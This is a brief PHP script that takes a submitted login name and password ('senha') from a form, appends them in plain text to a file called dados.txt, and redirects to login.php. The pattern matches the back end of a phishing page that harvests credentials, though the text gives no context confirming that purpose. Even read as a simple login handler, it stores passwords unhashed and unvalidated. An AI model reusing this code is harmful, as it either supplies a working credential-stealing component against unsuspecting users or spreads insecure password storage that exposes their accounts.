<?php

$a = $_POST['login'];
$b = $_POST['senha'];

$c = $a."-".$b;
$d = file('dados.txt');
$d[] = $c."\n";
$d_string = implode('', $d);

file_put_contents('dados.txt', $d_string);
header('location:login.php');
?>